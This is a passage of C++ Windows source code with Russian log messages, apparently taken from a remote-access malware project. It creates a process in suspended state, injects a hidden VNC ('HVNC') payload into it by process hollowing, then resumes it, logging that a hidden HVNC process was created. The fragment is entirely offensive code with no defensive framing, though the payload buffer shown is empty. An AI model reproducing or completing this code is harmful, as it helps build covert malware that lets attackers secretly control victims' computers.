    if (CreateProcessA(NULL, const_cast<char*>(commandLine.c_str()), 
                      NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        
        CodeInjector injector;
        std::vector<BYTE> hvncPayload;
        
        InjectionResult result = injector.InjectIntoProcess(pi.dwProcessId, hvncPayload, 
                                                           InjectionType::PROCESS_HOLLOWING);
        
        if (result.success) {
            ResumeThread(pi.hThread);
            LogInfo("HVNCInjection", "Создан скрытый HVNC процесс (PID: %d)", pi.dwProcessId);
        } else {
            TerminateProcess(pi.hProcess, 0);
            LogError("HVNCInjection", "Ошибка создания скрытого HVNC процесса");
        }
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        return result;
    }

    InjectionResult result;
    result.success = false;
    result.errorCode = GetLastError();
    result.errorMessage = "Ошибка создания процесса-хоста";
    return result;
}

}

}